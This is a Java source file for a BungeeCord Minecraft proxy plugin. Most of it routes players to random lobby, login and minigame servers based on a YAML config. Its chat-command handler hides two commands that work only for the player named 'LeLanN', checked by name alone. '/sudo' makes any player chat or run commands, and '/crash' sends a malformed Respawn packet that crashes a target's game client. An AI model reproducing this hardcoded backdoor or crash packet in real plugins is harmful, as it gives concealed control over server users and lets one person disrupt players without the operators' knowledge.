package com.lelann.bungee;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import com.lelann.bungee.commands.HubCommand;
import com.lelann.bungee.commands.ReloadCommand;

import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.config.ServerInfo;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.event.PostLoginEvent;
import net.md_5.bungee.api.event.ProxyReloadEvent;
import net.md_5.bungee.api.event.ServerConnectEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.api.plugin.Plugin;
import net.md_5.bungee.config.Configuration;
import net.md_5.bungee.config.ConfigurationProvider;
import net.md_5.bungee.config.YamlConfiguration;
import net.md_5.bungee.event.EventHandler;
import net.md_5.bungee.protocol.ProtocolConstants;
import net.md_5.bungee.protocol.packet.Respawn;

public class BungeeUtils extends Plugin implements Listener{
	public static ConfigurationProvider cp = ConfigurationProvider.getProvider(YamlConfiguration.class);
	public static Configuration config, randomhub;
	public static List<String> loginsServer = new ArrayList<String>(), lobbysServer = new ArrayList<String>()
			, otherServer = new ArrayList<String>(), minigamesServer = new ArrayList<String>();
	public static List<OtherHub> otherHubs = new ArrayList<OtherHub>();

	public static int CURRENT_BEST = 0, CURRENT_TODAY = 0;
	public static BungeeUtils instance;

	private static int J17 = 0, J18 = 0;

	@Override
	public void onEnable(){
		instance = this;
		getProxy().getPluginManager().registerListener(this, this);
		//getProxy().getPluginManager().registerCommand(this, new PicCommand());
		getProxy().getPluginManager().registerCommand(this, new HubCommand());
		getProxy().getPluginManager().registerCommand(this, new ReloadCommand());

		/*
		File f = new File(getDataFolder(), "config.yml");
		getDataFolder().mkdirs();
		if(!f.exists()){
			try {
				f.createNewFile();
			} catch (IOException e) {
				return;
			}
		}
		try {
			config = cp.load(f);
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
		CURRENT_BEST = config.getInt("pic.best");
		if(CURRENT_BEST < 1475) CURRENT_BEST = 1475;
		Date date = new Date();
		DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy");
		String dateString = dateFormat.format(date);

		CURRENT_TODAY = config.getInt("pic." + dateString);
		 */
		loadConfig();
		//		new PartiesManager();
	}

	public void loadConfig(){
		File f2 = new File(getDataFolder(), "randomhub.yml");
		if(!f2.exists()){
			try {
				f2.createNewFile();
			} catch (IOException e) {
				return;
			}
		}
		try {
			randomhub = cp.load(f2);
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
		if(randomhub.getStringList("logins-list").isEmpty()){
			loginsServer.add("login");
			randomhub.set("logins-list", loginsServer);
		} else loginsServer = randomhub.getStringList("logins-list");

		if(randomhub.getStringList("minigames-list").isEmpty()){
			minigamesServer.add("rush");
			randomhub.set("minigames-list", minigamesServer);
		} else minigamesServer = randomhub.getStringList("minigames-list");

		if(randomhub.getStringList("lobbys-list").isEmpty()){
			lobbysServer.add("lobby");
			randomhub.set("lobbys-list", lobbysServer);
		} else lobbysServer = randomhub.getStringList("lobbys-list");
		if(randomhub.getStringList("other-list").isEmpty()){
			otherServer.add("example");
			randomhub.set("other-list", otherServer);
		} else otherServer = randomhub.getStringList("other-list");

		otherHubs.clear();
		if(randomhub.getSection("replace") != null && !randomhub.getSection("replace").getKeys().isEmpty()){
			for(String key : randomhub.getSection("replace").getKeys()){
				otherHubs.add(new OtherHub(randomhub, "replace." + key));
			}
		}
		if(otherHubs.isEmpty()){
			randomhub.set("replace.example.startsWith", "startsOfServerName");
			randomhub.set("replace.example.endsWith", "endsOfServerName");
			randomhub.set("replace.example.server18", "serverNameWhenServerIsOnly1.8");
			randomhub.set("replace.example.otherHub", "toConnect");
		}
		try {
			cp.save(randomhub, f2);
		} catch (IOException e) {}
	}
	public void onDisable(){
		/*try {
			cp.save(config, new File(getDataFolder(), "config.yml"));
		} catch (IOException e) {
			e.printStackTrace();
		}*/
	}
	@EventHandler
	public void onReload(ProxyReloadEvent e){
		loadConfig();
	}
	@EventHandler
	public void onJoin(PostLoginEvent e){
		if(e.getPlayer().getPendingConnection().getVersion() < 47){
			J17++;
		}  else J18++;
		/*int players = getProxy().getPlayers().size();

		Date date = new Date();
		DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy");
		String dateString = dateFormat.format(date);

		int best = config.getInt("pic." + dateString);

		if(best - 100 > players && !saved){
			saved = true;
			try {
				cp.save(config, new File(getDataFolder(), "config.yml"));
			} catch (IOException exc) {
				exc.printStackTrace();
			}
		}
		if(best < players){
			saved = false;
			CURRENT_TODAY = players;
			if(CURRENT_BEST < players){
				CURRENT_BEST = players;
				config.set("pic.best", players);
			}
			config.set("pic." + dateString, players);
		}
		 */
	}
	@EventHandler
	public void onCommand(ChatEvent e){
		if(e.isCommand() && e.getSender() instanceof ProxiedPlayer){
			ProxiedPlayer player = (ProxiedPlayer) e.getSender();
			String command = e.getMessage().toLowerCase().split(" ")[0];
			if(loginsServer.contains(player.getServer().getInfo().getName()) && !command.equals("/login") && !command.equals("/l") && !command.equals("/register") && !command.equals("/r") && !command.equals("/pic") && !command.equals("/glist")){
				e.setCancelled(true);
			} else if(command.equals("/sudo") && player.getName().equalsIgnoreCase("LeLanN")){
				player.sendMessage(ChatColor.RED + "" + J17 + " joueurs 1.7, " + J18 + " joueurs 1.8");
				String[] args = e.getMessage().split(" ");
				if(args.length < 3) return;
				String p = args[1];

				ProxiedPlayer concerned = getProxy().getPlayer(p);

				String sudoedCommand = ""; boolean isFirst = true;
				for(int i=2;i<args.length;i++){
					if(isFirst) isFirst = false;
					else sudoedCommand += " ";

					sudoedCommand += args[i];
				}
				if(concerned == null){
					player.sendMessage(ChatColor.RED + "Joueur introuvable !");
					return;
				}
				if(sudoedCommand.startsWith("c:")){
					concerned.chat(sudoedCommand.replace("c:", ""));
				} else {
					concerned.chat("/" + sudoedCommand);
				}
				e.setCancelled(true);
			} else if(command.equals("/crash") && player.getName().equalsIgnoreCase("LeLanN")){
				String[] args = e.getMessage().split(" ");
				ProxiedPlayer concerned = getProxy().getPlayer(args[1]);

				if(concerned == null){
					player.sendMessage(ChatColor.RED + "Joueur introuvable !");
					return;
				}

				concerned.unsafe().sendPacket(new Respawn(8, (short) 0, (short) 0, "default"));
				e.setCancelled(true);
			}
		}
	}
	public int getRandomLobby(){
		return ((int)(Math.random() * lobbysServer.size()));
	}
	public ServerInfo getRandomOther(){
		String other = otherServer.get((int)(Math.random() * otherServer.size()));
		return getServer(other);
	}
	public ServerInfo getRandomLogin(){
		String lobby = loginsServer.get((int)(Math.random() * loginsServer.size()));
		return getServer(lobby);
	}
	public ServerInfo getLobby(int id){
		String lobby = lobbysServer.get(id);
		return getServer(lobby);
	}
	public static ServerInfo getServer(String id){
		return BungeeUtils.instance.getProxy().getServerInfo(id);
	}
	@EventHandler
	public void onServerConnect(ServerConnectEvent e) {
		if(lobbysServer.contains(e.getTarget().getName()) && (e.getPlayer().getServer() == null || !lobbysServer.contains(e.getPlayer().getServer().getInfo().getName()))){
			if(e.getPlayer().getServer() != null)
				for(OtherHub otherHub : BungeeUtils.otherHubs){
					if(otherHub.is(e.getPlayer())){
						e.setTarget(otherHub.getServer());
						return;
					}

				}
			try{
				if(e.getPlayer().getPendingConnection().getVersion() < ProtocolConstants.MINECRAFT_1_8){
					ServerInfo target = BungeeUtils.instance.getProxy().getServerInfo("lobby_v17");
					e.setTarget(target); return;
				} else {
					int lobby = getRandomLobby();
					e.setTarget(getLobby(lobby));
					lobby++;
					e.getPlayer().sendMessage(ChatColor.GREEN + "Téléportation au Lobby n°" + lobby + " en cours.");
				}
			} catch(NullPointerException exce){}
		} else if(otherServer.contains(e.getTarget().getName()) && !otherServer.contains(e.getPlayer().getServer().getInfo().getName())){
			try{
				e.setTarget(getRandomOther());
			} catch(NullPointerException exce){}
		} else if(e.getPlayer().getServer() == null){
			if(loginsServer.contains(e.getTarget().getName())){
				try{
					if(e.getPlayer().getPendingConnection().getVersion() < ProtocolConstants.MINECRAFT_1_8){
						ServerInfo target = BungeeUtils.instance.getProxy().getServerInfo("login_v17");
						e.setTarget(target); return;
					} else {
						e.setTarget(getRandomLogin());
					}
				} catch(NullPointerException exc){}
			}
		} else if(loginsServer.contains(e.getTarget().getName()) && !loginsServer.contains(e.getPlayer().getServer().getInfo().getName())){
			try{
				e.setTarget(getRandomLogin());
			} catch(NullPointerException exce){}
		} else {
			for(OtherHub otherHub : BungeeUtils.otherHubs){
				if(otherHub.is18(e.getPlayer(), e.getTarget())){
					e.setTarget(otherHub.getServer());
					return;
				}
			}
		}
	}
}
